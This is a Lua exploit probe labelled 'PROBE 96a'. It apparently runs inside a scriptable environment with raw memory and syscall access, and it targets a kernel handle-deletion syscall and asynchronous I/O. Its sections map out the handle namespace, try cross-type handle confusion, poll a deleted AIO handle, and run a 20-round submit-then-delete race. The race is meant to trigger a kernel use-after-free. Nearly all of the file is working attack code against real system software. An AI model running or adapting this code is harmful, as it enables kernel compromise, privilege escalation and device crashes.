-- CRASH_CLASS: MODERATE
-- PROBE 96a: Handle namespace exploitation + AIO kernel UAF race
--
-- Context: Deep analysis reveals:
-- 1. sys 558 is a GENERIC handle deletion syscall — takes ID + 16-bit type,
--    OR's type with 0x1000, looks up in process+0xc48 namespace, frees object.
--    NO visible priv_check in the handler body.
-- 2. sys 669 (AIO submit) PUBLISHES handle ID BEFORE worker queue setup (offset
--    0x569-0x587 in the handler). The AIO worker runs on a kernel thread.
-- 3. Five subsystems share process+0xc48 with NO credential checks:
--    type 0x120 = semaphore, type 0x160 = AIO, others unknown.
--
-- Attack: submit AIO → immediately delete handle via sys 558 → kernel worker
-- tries to dereference freed handle = KERNEL USE-AFTER-FREE (no threading needed,
-- the race is against the kernel's own AIO worker thread).
--
-- Section A: sys 558 reachability — delete with bogus/invalid handles
-- Section B: Semaphore create (549) + cross-type delete via 558
-- Section C: AIO init (670) + submit (669) + delete via 558 → poll (664) freed handle
-- Section D: AIO submit + immediate delete race (UAF trigger)

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 96a: HANDLE NAMESPACE + AIO UAF ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc558 = make_syscall(558)   -- generic handle delete (ID + type)
local sc549 = make_syscall(549)   -- semaphore create (type 0x120)
local sc550 = make_syscall(550)   -- semaphore delete
local sc554 = make_syscall(554)   -- semaphore poll/try-wait
local sc669 = make_syscall(669)   -- AIO submit (type 0x160)
local sc670 = make_syscall(670)   -- AIO init
local sc664 = make_syscall(664)   -- AIO poll
local sc662 = make_syscall(662)   -- AIO multi delete
local sc97  = make_syscall(97)    -- socket
local sc135 = make_syscall(135)   -- socketpair
local sc20  = make_syscall(20)    -- getpid
local sc624 = make_syscall(624)   -- VM op counter (safe baseline)

if TEST_SECTION == "A" then
    print("--- Section A: sys 558 reachability ---")
    print("  Handler: 2 args — ID(uint32) + type(uint16)")
    print("  Behavior: type |= 0x1000, lookup in process+0xc48, free object")
    print("")

    -- Test 1: Invalid handle ID with various types
    print("[A1] sys 558 with invalid ID=0xDEAD, various types:")
    local test_types = {0, 1, 0x20, 0x60, 0x80, 0x100, 0x120, 0x140, 0x160, 0x200, 0xFFFF}
    for _, typ in ipairs(test_types) do
        local ok, rv = pcall(function()
            return sc558(uint64(0xDEAD), uint64(typ))
        end)
        if ok then
            local r = to_num(rv)
            print(string.format("  type=0x%04X: ret=%d%s", typ, r,
                r == 3 and " (not found)" or
                r == 0 and " *** DELETED ***" or ""))
        else
            print(string.format("  type=0x%04X: PCALL-FAIL", typ))
        end
    end
    print("")

    -- Test 2: ID=0 with type=0 (edge case)
    print("[A2] sys 558 with ID=0, type=0:")
    local ok, rv = pcall(function() return sc558(uint64(0), uint64(0)) end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("")

    -- Test 3: Large IDs
    print("[A3] sys 558 with large IDs, type=0x120:")
    local large_ids = {0x7FFFFFFF, 0x80000000, 0xFFFFFFFF, 1, 2, 3, 100}
    for _, id in ipairs(large_ids) do
        ok, rv = pcall(function()
            return sc558(uint64(id), uint64(0x120))
        end)
        if ok then
            print(string.format("  ID=0x%X: ret=%d", id, to_num(rv)))
        else
            print(string.format("  ID=0x%X: PCALL-FAIL", id))
        end
    end

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Cross-type handle confusion ---")
    print("  Create semaphore (type 0x120) → delete via sys 558 with wrong type")
    print("")

    -- Step 1: Create a semaphore handle
    -- sys 549: create semaphore — args: name_ptr, flags, initial_count, max_count, handle_out
    local name_buf = memory.alloc(32)
    memory.write_byte(name_buf, 0x54)     -- 'T'
    memory.write_byte(name_buf + 1, 0x53) -- 'S'
    memory.write_byte(name_buf + 2, 0x54) -- 'T'
    memory.write_byte(name_buf + 3, 0x00) -- null

    local handle_out = memory.alloc(8)
    safe_wq(handle_out, uint64(0))

    print("[B1] Creating semaphore via sys 549:")
    local ok, rv = pcall(function()
        return sc549(uint64(name_buf), uint64(0x100), uint64(1), uint64(10), uint64(handle_out))
    end)
    local sem_handle = safe_rd(handle_out) or 0
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("  handle=" .. string.format("0x%X", sem_handle))
    print("")

    if sem_handle ~= 0 then
        -- Step 2: Try poll/try-wait to confirm handle works
        print("[B2] Semaphore poll (sys 554) to verify handle:")
        ok, rv = pcall(function()
            return sc554(uint64(sem_handle), uint64(0))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        print("")

        -- Step 3: Try delete with WRONG type via sys 558
        -- Real type is 0x120. Try 0x160 (AIO type)
        print("[B3] Cross-type delete: sem handle via sys 558 type=0x160:")
        ok, rv = pcall(function()
            return sc558(uint64(sem_handle), uint64(0x160))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        local r = ok and to_num(rv) or -999
        if r == 0 then
            print("  *** TYPE CONFUSION: deleted sem as AIO type! ***")
        elseif r == 3 then
            print("  (not found — type check works)")
        end
        print("")

        -- Step 4: Try delete with CORRECT type via sys 558
        print("[B4] Correct-type delete: sem handle via sys 558 type=0x120:")
        ok, rv = pcall(function()
            return sc558(uint64(sem_handle), uint64(0x120))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        r = ok and to_num(rv) or -999
        if r == 0 then
            print("  *** SUCCESS: sys 558 can delete semaphore handles! ***")
        end
        print("")

        -- Step 5: Verify handle is gone
        print("[B5] Poll after delete (should fail):")
        ok, rv = pcall(function()
            return sc554(uint64(sem_handle), uint64(0))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        print("")

        -- Step 6: Try different type values to map the namespace
        print("[B6] Type probing — create sem, try each type:")
        for trial = 1, 3 do
            local nb = memory.alloc(32)
            memory.write_byte(nb, 0x54 + trial)
            memory.write_byte(nb + 1, 0x00)
            local ho = memory.alloc(8)
            safe_wq(ho, uint64(0))
            local ok2, rv2 = pcall(function()
                return sc549(uint64(nb), uint64(0x100), uint64(1), uint64(10), uint64(ho))
            end)
            local h = safe_rd(ho) or 0
            if h ~= 0 then
                -- Try type 0 (raw, no OR with 0x1000 would be just 0x1000)
                ok2, rv2 = pcall(function()
                    return sc558(uint64(h), uint64(0))
                end)
                local r2 = ok2 and to_num(rv2) or -999
                print(string.format("  trial %d: handle=0x%X, type=0x0000 → ret=%d%s",
                    trial, h, r2, r2 == 0 and " *** TYPE BYPASS ***" or ""))
                if r2 ~= 0 then
                    -- Clean up with correct type
                    pcall(function() sc558(uint64(h), uint64(0x120)) end)
                end
            end
        end
    end

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: AIO lifecycle + handle manipulation ---")
    print("  Init (670) → Submit (669) → Delete via 558 → Poll (664)")
    print("")

    -- Step 1: AIO init with null config (default)
    print("[C1] AIO init (sys 670) with null config:")
    local ok, rv = pcall(function()
        return sc670(uint64(0), uint64(0x3C), uint64(0), uint64(0))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    local init_ok = ok and to_num(rv) == 0
    if not init_ok then
        print("  AIO init failed, trying without length:")
        ok, rv = pcall(function()
            return sc670(uint64(0), uint64(0), uint64(0), uint64(0))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        init_ok = ok and to_num(rv) == 0
    end
    print("")

    -- Step 2: Create a socket for AIO I/O target
    print("[C2] Creating socket pair for AIO fd target:")
    local sv = memory.alloc(16)
    safe_wd(sv, 0)
    safe_wd(sv + 4, 0)
    ok, rv = pcall(function()
        return sc135(uint64(1), uint64(1), uint64(0), uint64(sv))
    end)
    local fd0 = safe_rd(sv) or -1
    local fd1 = safe_rd(sv + 4) or -1
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("  fd0=" .. fd0 .. " fd1=" .. fd1)
    print("")

    -- Step 3: Build AIO submit request descriptor (0x28 bytes)
    -- From sys_669_deep.md:
    --   +0x00: I/O offset (8 bytes)
    --   +0x08: byte count (8 bytes)
    --   +0x10: data pointer (8 bytes)
    --   +0x18: result pointer (8 bytes)
    --   +0x20: fd (4 bytes) + padding
    local data_buf = memory.alloc(256)
    local result_buf = memory.alloc(64)
    local req = memory.alloc(0x30)  -- 0x28 descriptor + padding

    -- Fill data buffer with pattern
    for i = 0, 63 do safe_wd(data_buf + i * 4, 0x41414141) end

    -- Build request descriptor
    safe_wq(req + 0x00, uint64(0))           -- offset = 0
    safe_wq(req + 0x08, uint64(64))          -- count = 64 bytes
    safe_wq(req + 0x10, uint64(data_buf))    -- data pointer
    safe_wq(req + 0x18, uint64(result_buf))  -- result pointer
    if fd0 >= 0 then
        safe_wd(req + 0x20, fd0)             -- fd
    else
        safe_wd(req + 0x20, 1)               -- stdout fallback
    end

    local output_ids = memory.alloc(64)

    -- Step 4: AIO submit — write cmd=2, count=1, class=1
    print("[C3] AIO submit (sys 669): write cmd=2, 1 request:")
    ok, rv = pcall(function()
        return sc669(uint64(2), uint64(req), uint64(1), uint64(1), uint64(output_ids))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    local submit_ok = ok and to_num(rv) == 0

    -- Read the handle ID that was returned
    local aio_id = safe_rd(output_ids) or 0
    local aio_id_hi = safe_rd(output_ids + 4) or 0
    print("  returned handle ID: " .. string.format("0x%X%08X", aio_id_hi, aio_id))
    print("")

    -- Step 5: Poll the AIO handle BEFORE deletion
    if aio_id ~= 0 or aio_id_hi ~= 0 then
        print("[C4] AIO poll (sys 664) on live handle:")
        local poll_ids = memory.alloc(16)
        local poll_states = memory.alloc(16)
        safe_wd(poll_ids, aio_id)
        safe_wd(poll_ids + 4, aio_id_hi)
        safe_wd(poll_states, 0xDEAD)
        ok, rv = pcall(function()
            return sc664(uint64(poll_ids), uint64(1), uint64(poll_states))
        end)
        local state = safe_rd(poll_states) or 0
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        print("  state=" .. string.format("0x%X", state))
        print("")

        -- Step 6: Delete via sys 558 with type 0x160 (AIO type)
        print("[C5] Delete AIO handle via sys 558 (type=0x160):")
        ok, rv = pcall(function()
            return sc558(uint64(aio_id), uint64(0x160))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        local del_ok = ok and to_num(rv) == 0
        if del_ok then
            print("  *** AIO handle deleted via sys 558! ***")
        else
            print("  (trying raw ID without type)")
            -- Maybe the AIO subsystem uses its own ID scheme
            ok, rv = pcall(function()
                return sc558(uint64(aio_id), uint64(0))
            end)
            print("  type=0: ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        end
        print("")

        -- Step 7: Poll AFTER deletion (UAF trigger point)
        print("[C6] AIO poll AFTER delete (UAF test):")
        safe_wd(poll_states, 0xDEAD)
        ok, rv = pcall(function()
            return sc664(uint64(poll_ids), uint64(1), uint64(poll_states))
        end)
        state = safe_rd(poll_states) or 0
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        print("  state=" .. string.format("0x%X", state))
        if ok and to_num(rv) == 0 then
            print("  *** POLL SUCCEEDED ON DELETED HANDLE — UAF CONFIRMED ***")
        end
    else
        print("[C4] No handle ID returned, skipping delete/poll test")
    end

    -- Step 8: Also try AIO multi-delete (sys 662) for comparison
    print("")
    print("[C7] Baseline: AIO multi-delete (sys 662) with bogus ID:")
    local del_ids = memory.alloc(16)
    local del_results = memory.alloc(16)
    safe_wd(del_ids, 0xDEAD)
    safe_wd(del_ids + 4, 0)
    safe_wd(del_results, 0xBEEF)
    ok, rv = pcall(function()
        return sc662(uint64(del_ids), uint64(1), uint64(del_results))
    end)
    local del_result = safe_rd(del_results) or 0
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("  result[0]=" .. string.format("0x%X", del_result))

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: AIO submit + immediate delete race ---")
    print("  Race kernel AIO worker: submit → delete → worker UAFs freed handle")
    print("")

    -- Init AIO
    print("[D1] AIO init:")
    local ok, rv = pcall(function()
        return sc670(uint64(0), uint64(0x3C), uint64(0), uint64(0))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))

    -- Create socketpair
    local sv = memory.alloc(16)
    safe_wd(sv, 0); safe_wd(sv + 4, 0)
    pcall(function() sc135(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
    local fd0 = safe_rd(sv) or -1
    print("  fd=" .. fd0)
    print("")

    -- Prepare a LARGE write to keep worker busy
    local big_data = memory.alloc(0x4000)  -- 16KB
    for i = 0, 0xFFF do safe_wd(big_data + i * 4, 0x42424242) end
    local result_buf = memory.alloc(64)
    local output_ids = memory.alloc(64)

    -- Build request for large write
    local req = memory.alloc(0x30)
    safe_wq(req + 0x00, uint64(0))            -- offset
    safe_wq(req + 0x08, uint64(0x4000))        -- 16KB write
    safe_wq(req + 0x10, uint64(big_data))      -- data
    safe_wq(req + 0x18, uint64(result_buf))    -- result
    if fd0 >= 0 then
        safe_wd(req + 0x20, fd0)
    else
        safe_wd(req + 0x20, 1)
    end

    -- Race loop: submit + immediately delete, repeat N times
    -- Each iteration is a chance for the kernel worker to touch freed memory
    local RACE_ROUNDS = 20
    print("[D2] Racing " .. RACE_ROUNDS .. " rounds: submit → immediate delete")
    print("")

    for round = 1, RACE_ROUNDS do
        safe_wq(output_ids, uint64(0))
        safe_wq(output_ids + 4, uint64(0))

        -- Submit AIO write
        local sok, srv = pcall(function()
            return sc669(uint64(2), uint64(req), uint64(1), uint64(1), uint64(output_ids))
        end)
        local sub_ret = sok and to_num(srv) or -999
        local handle = safe_rd(output_ids) or 0
        local handle_hi = safe_rd(output_ids + 4) or 0

        if sub_ret == 0 and (handle ~= 0 or handle_hi ~= 0) then
            -- IMMEDIATELY delete via sys 558 (race the worker)
            local dok, drv = pcall(function()
                return sc558(uint64(handle), uint64(0x160))
            end)
            local del_ret = dok and to_num(drv) or -999

            -- Also try native AIO delete as fallback
            local dok2, drv2
            if del_ret ~= 0 then
                local del_ids = memory.alloc(16)
                local del_res = memory.alloc(16)
                safe_wd(del_ids, handle)
                safe_wd(del_ids + 4, handle_hi)
                dok2, drv2 = pcall(function()
                    return sc662(uint64(del_ids), uint64(1), uint64(del_res))
                end)
            end

            print(string.format("  round %2d: handle=0x%X%08X submit=%d del558=%d%s",
                round, handle_hi, handle, sub_ret, del_ret,
                del_ret == 0 and " *** DELETED ***" or
                (dok2 and to_num(drv2) == 0 and " (del662 ok)" or "")))
        else
            print(string.format("  round %2d: submit ret=%d handle=0x%X (skip)",
                round, sub_ret, handle))
        end
    end
    print("")

    -- Check if we're still alive
    print("[D3] Post-race stability check:")
    ok, rv = pcall(function() return sc624() end)
    print("  sys 624 ret=" .. (ok and fmt(rv) or "FAIL"))

    ok, rv = pcall(function() return sc20() end)
    print("  getpid ret=" .. (ok and fmt(rv) or "FAIL"))

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 96a COMPLETE ===")
